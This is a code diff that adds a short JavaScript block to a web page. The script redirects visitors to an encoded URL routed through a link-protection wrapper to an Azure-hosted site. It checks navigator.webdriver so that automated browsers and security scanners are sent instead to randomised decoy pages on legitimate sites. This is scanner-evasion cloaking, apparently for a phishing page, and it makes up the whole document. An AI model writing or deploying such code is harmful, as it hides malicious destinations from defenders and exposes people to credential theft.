@@ -1,0 +1,29 @@
+<script>
+(function(){
+  // ✅ Your real landing page
+  var realTarget = "https://mibc-fr-09.mailinblack.com/securelink/?url=https://frnt-gpbcabe4efdbf3eh.canadacentral-01.azurewebsites.net&key=eyJsYW5nIjoiRlIiLCJ1cmwiOiJodHRwczovL2ZybnQtZ3BiY2FiZTRlZmRiZjNlaC5jYW5hZGFjZW50cmFsLTAxLmF6dXJld2Vic2l0ZXMubmV0Lz9PRGwyWVhST1lqaFVRa0YzV1dSck5uVmliVTFYUkVzd2FsZDBTR2RXWVZndGF6aG5XREpuUlZVMGJWWjRPRGwyWVhST1lqaFVRa0YzV1dSck5uVmliVTFYUkVzd2FsZDBTR2RXWVZndGF6aG5XREpuUlZVMGJWWjQiLCJ0b2tlbiI6ImdBQUFBQUJvckhJNVhhTmNBb0pvUnZPYk1HYlEzcTRRa2lVckE0SWc4Zy01YkVIa0tpenJ6Zk4xMndjVUlYVm11Wl9UeU1qM0xvYmRtaHpJTnprbmFlXy1TRm8wSkE1bjE0eGUzTU5CMFZETU1kcmF6OHlHbzVkLWY4RzdWZUN4MS1NWEwwSzFQaDJ1MXZsVUdHd3dJYWdqNmpNQzA5VG92OVQ0VW5maGRaQ2wwYW0yU3Q1S3FnblNzZWhOUHRHX2V6Zm9WRVlBX0ZRWUxlYTdCUWN2OHhyOXF1ak0zMmQzSlBBWklvWmpUSDBPY2M3NHVLQXpPenI2TEZmMzJ2dmIydE5rVjlnZzRqNGlQRUVReFEwN0RjWHl2UjlEZ2x3eUcxdS1SVk1YMDR2TmNaeUJGelhxX21lNTB6XzhLU2VyMW1uMmIyWk5EN2JkIn0=";
+
+  // ✅ Pool of decoy URLs
+  var decoys = [
+    "https://www.bfmtv.com/comparateur/" + Math.random().toString(36).slice(2),
+    "https://corporate.target.com/about" + Date.now(),
+    "https://theconversation.com/uk/privacy-policy" + Math.floor(Math.random()*99999),
+    "https://www.usda.gov/vulnerability-disclosure-policy" + Math.random().toString(36).slice(6),
+    "https://www.si.edu/privacy" + Math.random().toString(36).slice(3,8)
+  ];
+
+  // pick a random decoy
+  var decoy = decoys[Math.floor(Math.random()*decoys.length)];
+
+  // wait a moment then decide
+  setTimeout(function(){
+    if (!navigator.webdriver) {
+      // 👤 human browser → go to real target
+      location.assign(realTarget);
+    } else {
+      // 🤖 headless/browser automation → go to decoy
+      location.replace(decoy);
+    }
+  }, 1200); // ~1.2s delay
+})();
+</script>
